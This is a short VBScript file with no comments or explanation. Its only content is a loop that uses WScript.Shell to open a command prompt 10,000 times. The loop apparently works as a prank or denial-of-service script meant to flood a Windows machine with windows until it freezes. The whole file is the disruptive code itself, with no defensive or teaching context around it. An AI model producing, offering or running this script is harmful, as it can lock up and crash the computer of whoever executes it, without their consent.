Option Explicit

Dim WSHShell
Set WSHShell = WScript.CreateObject("WScript.Shell")

Dim x
For x = 1 To 10000
    WSHShell.Run "cmd"
Next
